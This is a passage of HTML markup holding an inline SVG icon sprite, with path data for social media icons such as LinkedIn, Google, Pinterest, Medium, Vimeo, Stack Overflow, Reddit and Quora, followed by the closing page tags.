102.4 102.4h716.8c56.32 0 102.4-46.029 102.4-102.4v-716.8c0-56.32-46.080-102.4-102.4-102.4zM511.181 794.778c156.621 0 283.546-127.027 283.546-283.597 0-17.306-2.202-33.997-5.274-50.381h80.947v369.459c0 19.558-15.872 35.328-35.482 35.328h-645.837c-19.61 0-35.482-15.77-35.482-35.328v-369.459h79.309c-3.123 16.384-5.325 33.075-5.325 50.381 0 156.621 127.027 283.597 283.597 283.597zM333.978 511.181c0-97.894 79.36-177.203 177.254-177.203 97.843 0 177.254 79.309 177.254 177.203s-79.411 177.254-177.254 177.254c-97.946 0-177.254-79.36-177.254-177.254zM834.918 307.2h-82.688c-19.558 0-35.43-15.974-35.43-35.43v-82.79c0-19.558 15.872-35.379 35.379-35.379h82.688c19.661 0 35.533 15.821 35.533 35.379v82.739c0 19.507-15.872 35.482-35.482 35.482z"></path> </symbol> <symbol id="icon-linkedin" viewBox="0 0 1024 1024"> <title>linkedin</title> <path class="path1" d="M256 153.6c0 54.374-36.352 101.171-102.451 101.171-62.208 0-102.349-44.134-102.349-98.509 0-55.808 38.912-105.062 102.4-105.062s101.171 46.592 102.4 102.4zM51.2 972.8v-665.6h204.8v665.6h-204.8z"></path> <path class="path2" d="M358.4 534.733c0-79.104-2.611-145.203-5.222-202.291h184.013l9.114 88.218h3.891c25.907-41.523 89.395-102.4 195.686-102.4 129.638 0 226.918 86.784 226.918 273.51v381.030h-204.8v-351.283c0-81.613-31.078-143.872-102.4-143.872-54.374 0-81.613 44.032-95.898 80.333-5.222 13.005-6.502 31.13-6.502 49.306v365.517h-204.8v-438.067z"></path> </symbol> <symbol id="icon-google" viewBox="0 0 1024 1024"> <title>google</title> <path class="path1" d="M522.2 438.8v175.6h290.4c-11.8 75.4-87.8 220.8-290.4 220.8-174.8 0-317.4-144.8-317.4-323.2s142.6-323.2 317.4-323.2c99.4 0 166 42.4 204 79l139-133.8c-89.2-83.6-204.8-134-343-134-283 0-512 229-512 512s229 512 512 512c295.4 0 491.6-207.8 491.6-500.2 0-33.6-3.6-59.2-8-84.8l-483.6-0.2z"></path> </symbol> <symbol id="icon-google-plus" viewBox="0 0 1317 1024"> <title>google-plus</title> <path class="path1" d="M821.143 521.714q0 118.857-49.714 211.714t-141.714 145.143-210.857 52.286q-85.143 0-162.857-33.143t-133.714-89.143-89.143-133.714-33.143-162.857 33.143-162.857 89.143-133.714 133.714-89.143 162.857-33.143q163.429 0 280.571 109.714l-113.714 109.143q-66.857-64.571-166.857-64.571-70.286 0-130 35.429t-94.571 96.286-34.857 132.857 34.857 132.857 94.571 96.286 130 35.429q47.429 0 87.143-13.143t65.429-32.857 44.857-44.857 28-47.429 12.286-42.286h-237.714v-144h395.429q6.857 36 6.857 69.714zM1316.571 452v120h-119.429v119.429h-120v-119.429h-119.429v-120h119.429v-119.429h120v119.429h119.429z"></path> </symbol> <symbol id="icon-pinterest" viewBox="0 0 1024 1024"> <title>pinterest</title> <path class="path1" d="M512 68.4c-245 0-443.6 198.6-443.6 443.6 0 188 117 348.4 282 413-3.8-35-7.4-89 1.6-127.2 8-34.6 52-220.4 52-220.4s-13.2-26.6-13.2-65.8c0-61.6 35.8-107.8 80.2-107.8 37.8 0 56.2 28.4 56.2 62.4 0 38-24.2 95-36.8 147.6-10.6 44.2 22 80.2 65.6 80.2 78.8 0 139.4-83.2 139.4-203.2 0-106.2-76.4-180.4-185.2-180.4-126.2 0-200.2 94.6-200.2 192.6 0 38.2 14.6 79 33 101.2 3.6 4.4 4.2 8.2 3 12.8-3.4 14-10.8 44.2-12.4 50.4-2 8.2-6.4 9.8-14.8 6-55.4-25.8-90-106.8-90-171.8 0-140 101.6-268.4 293-268.4 153.8 0 273.4 109.6 273.4 256.2 0 152.8-96.4 276-230.2 276-45 0-87.2-23.4-101.6-51 0 0-22.2 84.6-27.6 105.4-10 38.6-37 86.8-55.2 116.2 41.6 12.8 85.6 19.8 131.4 19.8 245 0 443.6-198.6 443.6-443.6 0-245.2-198.6-443.8-443.6-443.8z"></path> </symbol> <symbol id="icon-medium" viewBox="0 0 179.2 179.2"> <title>medium</title> <path transform="scale(0.1,-0.1) translate(0,-1536)" d="M597 1115v-1173q0 -25 -12.5 -42.5t-36.5 -17.5q-17 0 -33 8l-465 233q-21 10 -35.5 33.5t-14.5 46.5v1140q0 20 10 34t29 14q14 0 44 -15l511 -256q3 -3 3 -5zM661 1014l534 -866l-534 266v600zM1792 996v-1054q0 -25 -14 -40.5t-38 -15.5t-47 13l-441 220zM1789 1116 q0 -3 -256.5 -419.5t-300.5 -487.5l-390 634l324 527q17 28 52 28q14 0 26 -6l541 -270q4 -2 4 -6z" /> </symbol> <symbol id="icon-vimeo" viewBox="0 0 21 21"> <title>vimeo</title> <path d="M17.811,2.018c2.017,0.053,3.026,1.198,3.036,3.438c0,0.147-0.005,0.3-0.013,0.457c-0.089,1.899-1.502,4.486-4.245,7.76 c-2.829,3.43-5.229,5.147-7.2,5.156c-1.226,0-2.244-1.05-3.061-3.151l-0.858-2.88L4.622,9.922C3.997,7.838,3.329,6.798,2.616,6.798 c-0.156,0-0.697,0.304-1.626,0.91L0,6.537l1.536-1.276l1.511-1.263C4.4,2.914,5.429,2.328,6.135,2.241 c0.094-0.01,0.188-0.013,0.284-0.013c1.449,0,2.354,1.041,2.709,3.124C9.326,6.54,9.49,7.506,9.623,8.248 C9.752,8.992,9.86,9.51,9.946,9.805c0.479,1.97,0.995,2.96,1.55,2.968c0.426,0,1.082-0.642,1.968-1.926 c0.866-1.319,1.332-2.296,1.392-2.932c0.019-0.129,0.026-0.25,0.026-0.362c0-0.861-0.474-1.29-1.418-1.29 c-0.479,0-0.99,0.102-1.537,0.299c0.98-3.021,2.864-4.534,5.65-4.544C17.655,2.018,17.732,2.018,17.811,2.018z"/> </symbol> <symbol id="icon-stackoverflow" viewBox="0 0 878 1024"> <title>stackoverflow</title> <path class="path1" d="M736.571 932.571h-638.857v-274.286h-91.429v365.714h821.714v-365.714h-91.429v274.286zM198.286 633.143l18.857-89.714 447.429 94.286-18.857 89.143zM257.143 419.429l38.286-83.429 414.286 193.714-38.286 82.857zM372 216l58.286-70.286 350.857 293.143-58.286 70.286zM598.857 0l272.571 366.286-73.143 54.857-272.571-366.286zM188.571 840.571v-90.857h457.143v90.857h-457.143z"></path> </symbol> <symbol id="icon-reddit" viewBox="0 0 1024 1024"> <title>reddit</title> <path class="path1" d="M1024 483.429q0 33.143-16.857 60.286t-45.429 41.429q6.857 26.286 6.857 54.857 0 88.571-60.857 164t-166 119.143-228.571 43.714-228.286-43.714-165.714-119.143-60.857-164q0-26.857 6.286-53.714-29.143-14.286-46.857-42t-17.714-60.857q0-46.857 33.143-80.286t80.571-33.429q48.571 0 82.857 36 124.571-86.857 294.286-92.571l66.286-297.714q1.714-7.429 8.571-12t14.857-2.857l210.857 46.286q10.286-21.143 30.857-34t45.143-12.857q35.429 0 60.571 24.857t25.143 60.286-25.143 60.571-60.571 25.143-60.286-24.857-24.857-60.286l-190.857-42.286-59.429 269.714q171.429 5.143 296.571 91.429 33.143-34.857 81.714-34.857 47.429 0 80.571 33.429t33.143 80.286zM238.857 597.143q0 35.429 24.857 60.571t60.286 25.143 60.571-25.143 25.143-60.571-25.143-60.286-60.571-24.857q-34.857 0-60 25.143t-25.143 60zM701.714 800q6.286-6.286 6.286-14.857t-6.286-14.857q-5.714-5.714-14.286-5.714t-14.857 5.714q-23.429 24-69.143 35.429t-91.429 11.429-91.429-11.429-69.143-35.429q-6.286-5.714-14.857-5.714t-14.286 5.714q-6.286 5.714-6.286 14.571t6.286 15.143q24.571 24.571 67.714 38.857t70 16.857 52 2.571 52-2.571 70-16.857 67.714-38.857zM700 682.857q35.429 0 60.286-25.143t24.857-60.571q0-34.857-25.143-60t-60-25.143q-35.429 0-60.571 24.857t-25.143 60.286 25.143 60.571 60.571 25.143z"></path> </symbol> <symbol id="icon-quora" viewBox="0 0 76 76"> <title>quora</title> <path class="path1" d="M67.9,59.1c0,0-0.4,5.3-5.2,5.3c-3.7,0-6.3-2.8-8.7-6.5c6.8-5.9,11.1-14.7,11.1-24.6C65.1,15.4,51.1,1,33.8,1 S2.6,15.4,2.6,33.2s14,32.2,31.3,32.2c3.1,0,6.2-0.5,9-1.4C46.5,69.8,51,75,58.2,75c14.6,0,15.2-15.9,15.2-15.9L67.9,59.1 L67.9,59.1z M33.8,60.2c-10.1,0-18.2-12.1-18.2-26.9S23.8,6.3,33.8,6.3s18.2,12.1,18.2,26.9c0,5.9-1.3,11.4-3.5,15.8 c-2.5-3.5-5.4-6.5-9.7-7.5c-7.5-1.7-14,1.7-16.1,3.4l1.9,4c0,0,2-1.1,6.8,0c3.1,0.7,5.4,4.9,8.1,9.8C37.9,59.7,35.9,60.2,33.8,60.2 z"></path> </symbol> <symbol id="icon-microphone" viewBox="-8 -4 34 37"> <title>quora</title> <path clip-rule="evenodd" d="M10.8,22.8V26h5v2h-5h-3h-5v-2h5v-3.2C3.4,22.2,0,18.7,0,14.4v-3 c0-0.1,0-0.3,0-0.4h2.8c0,0.3-0.1,0.6-0.1,0.9V14c0,3.3,2.9,6,6.5,6c3.6,0,6.5-2.7,6.5-6v-2.1c0-0.3,0-0.6-0.1-0.9h2.8 c0,0.1,0,0.3,0,0.4v3C18.6,18.7,15.2,22.2,10.8,22.8z M9.3,18c-2.5,0-4.5-2-4.5-4.5v-9C4.8,2,6.8,0,9.3,0s4.5,2,4.5,4.5v9 C13.8,16,11.8,18,9.3,18z" fill="#0D0D0D" fill-rule="evenodd"/> </symbol> </defs> </svg> </body> </html>
